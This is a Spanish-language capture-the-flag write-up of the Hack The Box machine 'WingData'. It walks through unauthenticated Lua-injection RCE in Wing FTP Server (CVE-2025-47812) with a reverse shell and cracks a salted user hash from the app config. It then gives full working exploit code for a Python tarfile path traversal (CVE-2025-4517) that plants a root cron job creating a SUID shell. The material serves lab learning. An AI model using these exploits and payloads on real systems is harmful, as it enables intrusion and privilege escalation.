---
title: "HTB WingData - Write-Up"
date: 2026-11-16
categories: [Hack The Box]
tags: [wing-ftp-server, cve-2025-47812, lua-injection, hash-cracking, cve-2025-4517, tarfile-path-traversal]
---

Write-up de **WingData**, máquina Linux de Hack The Box. El camino: RCE no autenticada por inyección Lua en Wing FTP Server, recuperación de credenciales desde la configuración interna de la aplicación, cracking de un hash SHA-256 con sal, y escalada final abusando de un path traversal en `tarfile` de Python que bypasea el filtro de seguridad `data` introducido en Python 3.12.

## Fase 1 — Reconocimiento

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.244.106 -oG allPorts
nmap -sVC -p22,80 -oN targeted 10.129.244.106
```

Dos puertos abiertos: **22** (SSH) y **80** (HTTP). El "Client Portal" de la web lleva a una página de login cuyo código fuente revela el producto detrás: **Wing FTP Server v7.4.3**.

Detalles relevantes del HTML del login:
- El formulario hace `POST` a `loginok.html` — no es un `.html` estático, es el endpoint CGI real de autenticación.
- Antes de enviar, sustituye `+` por tabulador (`\t`) en usuario y contraseña, herencia de cómo Wing FTP delimita internamente usuario y contraseña con ese carácter.
- Sin token CSRF visible.

## Fase 2 — CVE-2025-47812: RCE no autenticada en Wing FTP Server

La versión **7.4.3** es vulnerable a **CVE-2025-47812** (CVSS 10.0), una RCE no autenticada: `loginok.html` autentica el usuario comparando con `strlen()` (que se detiene en un byte nulo `\x00`), pero después escribe el nombre de usuario completo, sin sanear, en un archivo de sesión Lua. Inyectando `anonymous%00]]` seguido de código Lua se logra ejecución como `root` (Linux) o `SYSTEM` (Windows) al visitar después cualquier endpoint autenticado como `/dir.html`.

Explotación con el PoC público [CVE-2025-47812 de popyue](https://github.com/popyue/CVE-2025-47812):

```bash
# listener
nc -lvnp 4444

# exploit con reverse shell directa
python3 CVE-2025-47812.py http://10.129.244.106 --revshell --lhost <IP_ATACANTE> --lport 4444
```

```bash
id
# uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp)
```

## Fase 3 — Enumeración de la configuración de Wing FTP

Todo el árbol de instalación (`/opt/wftpserver/`) pertenece a `wingftp:wingftp`, incluidos `Data/`, `session/` y `session_admin/` — el propio servicio corre como `wingftp`, no como root, así que escribir sesiones Lua no da más privilegios de los que ya se tienen.

Lo interesante está en `Data/`, la configuración real de la aplicación:

```bash
cat /opt/wftpserver/Data/_ADMINISTRATOR/admins.xml
```

```xml
<ADMIN>
    <Admin_Name>admin</Admin_Name>
    <Password>a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba</Password>
</ADMIN>
```

Hash SHA-256 del admin del panel de Wing FTP. Un intento de cracking con `rockyou.txt` no da resultado — y, como se confirma más adelante, **no es el camino**: la escalada real pasa por los usuarios FTP definidos en `Data/1/users/`, no por el admin del panel.

```bash
cat /opt/wftpserver/Data/1/users/wacky.xml
```

```
Usuario: wacky
Hash: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
ProtocolType: 63  (FTP + FTPS + SFTP + HTTP)
LastLoginIp: 127.0.0.1, LoginCount: 2
```

A diferencia del hash del admin, el de `wacky` sí es crackeable con sal. `settings.xml` no declara explícitamente un `SaltingString`, pero la sal fija de Wing FTP para este formato es la cadena `WingFTP`:

```bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > wacky.txt
hashcat -m 1410 -O wacky.txt /usr/share/wordlists/rockyou.txt
```

```
:!#7Blushing^*Bride5
```

## Fase 4 — Acceso por SSH como wacky

El usuario `wacky` existe también como usuario del sistema, con la misma contraseña:

```bash
ssh wacky@10.129.244.106
# password: !#7Blushing^*Bride5

id
# uid=1001(wacky) gid=1001(wacky) groups=1001(wacky)
```

### Flag de usuario

```bash
cat /home/wacky/user.txt
```

## Fase 5 — Enumeración de privilegios

```bash
sudo -l
```

```
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

`wacky` puede ejecutar como root, sin contraseña y con **cualquier argumento** (`*`), un script Python de restauración de backups. El script valida el nombre del backup (`backup_<id>.tar`) y del directorio de destino (`restore_<tag>`), y extrae el `.tar` con `tarfile.extractall(..., filter="data")` — el filtro de seguridad introducido en Python 3.12 que bloquea rutas absolutas, `..`, y symlinks/hardlinks que escapen del directorio de extracción.

Rutas clave:
- `BACKUP_BASE_DIR = /opt/backup_clients/backups` → `root:wacky`, con permiso de escritura de grupo: `wacky` puede subir ahí el `.tar` de entrada.
- `STAGING_BASE = /opt/backup_clients/restored_backups` → `root:wacky`, solo lectura para el grupo: el script crea el subdirectorio de extracción como root.

## Fase 6 — Intento descartado: SUID vía tar

Primer intento, el clásico abuso de un script que extrae un `.tar` como root: empaquetar un `bash` con bit SUID y dejar que el proceso root lo extraiga.

```bash
mkdir -p /tmp/pwn && cd /tmp/pwn
cp /bin/bash ./bash
chmod 4755 ./bash
tar -cf backup_1001.tar bash
mv backup_1001.tar /opt/backup_clients/backups/
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_pwn
```

```bash
ls -la /opt/backup_clients/restored_backups/restore_pwn/
# -rwxr-xr-x 1 root root 1265648 ... bash      <-- sin bit SUID
```

El `bash` de origen sí tenía SUID (`-rwsr-xr-x`), pero tras la extracción lo pierde: **Python 3.12 con `filter="data"` elimina deliberadamente los bits SUID/SGID** al extraer, precisamente para frenar este vector. Camino descartado.

## Fase 7 — CVE-2025-4517: path traversal en `tarfile` que bypasea `filter="data"`

El filtro `data` de Python 3.12 bloquea rutas absolutas, `..` directo y symlinks que apunten fuera del staging — pero **CVE-2025-4517** lo elude encadenando una cadena de symlinks anidados cuyos componentes individuales son válidos (relativos, sin `..` explícito), de forma que la resolución final del enlace sí escapa del directorio de extracción.

El PoC construye, dentro de un único `.tar`:
1. Una cadena de 16 niveles de directorios/symlinks con nombres largos (`comp` de 247 caracteres) para generar suficiente profundidad de escape.
2. Un symlink final (`escape`) cuyo `linkname` resuelve, a través de esa cadena de `../`, hasta la ruta objetivo real fuera del staging.
3. Un hardlink (`inject`) apuntando a ese symlink, y el contenido real a escribir.

```python
import tarfile, os, io, sys

pubkey = b"ssh-ed25519 AAAA... root@kali\n"
comp = 'd' * (55 if sys.platform == 'darwin' else 247)
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("backup_2.tar", "x") as tar:
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp)); a.type = tarfile.DIRTYPE; tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i)); b.type = tarfile.SYMTYPE; b.linkname = comp; tar.addfile(b)
        path = os.path.join(path, comp)
    linkpath = os.path.join("/".join(steps), "l" * 254)
    l = tarfile.TarInfo(linkpath); l.type = tarfile.SYMTYPE; l.linkname = "../" * len(steps); tar.addfile(l)
    e = tarfile.TarInfo("escape"); e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../root/.ssh/authorized_keys"
    tar.addfile(e)
    f = tarfile.TarInfo("inject"); f.type = tarfile.LNKTYPE; f.linkname = "escape"; tar.addfile(f)
    c = tarfile.TarInfo("inject"); c.type = tarfile.REGTYPE; c.size = len(pubkey)
    tar.addfile(c, fileobj=io.BytesIO(pubkey))
```

### Primer objetivo descartado: `/root/.ssh/authorized_keys`

El primer intento inyecta una clave pública SSH propia en `/root/.ssh/authorized_keys`. Para validar que el CVE funcionaba de verdad (sin depender de si existía o no `/root/.ssh`), se probó primero contra una ruta legible por `wacky`:

```python
e.linkname = linkpath + "/../../../../home/wacky/.ssh/authorized_keys"
```

```bash
cat /home/wacky/.ssh/authorized_keys
# ssh-ed25519 AAAA... root@kali
```

El CVE funciona: la clave se inyectó correctamente. Pero repetido contra `/root/.ssh/authorized_keys`, el SSH como root seguía pidiendo contraseña. `sshd_config` confirmaba `PermitRootLogin prohibit-password` y `PubkeyAuthentication yes`, así que el servidor sí aceptaría la clave — el problema estaba en que **`/root/.ssh/` no existe por defecto**, y el CVE escribe el archivo vía symlink/hardlink pero no crea directorios intermedios que no existan.

### Vector final: `/etc/cron.d/`

En vez de depender de que exista `/root/.ssh`, se apunta a un directorio que sí existe siempre y es procesado periódicamente por root: `/etc/cron.d/`.

```python
payload = b"* * * * * root cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n"
# ... misma cadena de symlinks que arriba ...
e.linkname = linkpath + "/../../../../etc/cron.d/pwn"
```

```bash
cd /opt/backup_clients/backups/
python3 script_cron.py
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_4.tar --restore-dir restore_cron
```

Tras esperar a que `cron` ejecute la nueva entrada (hasta un minuto):

```bash
ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root 1265648 ... /tmp/rootbash
```

### Flag de root

```bash
/tmp/rootbash -p
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```
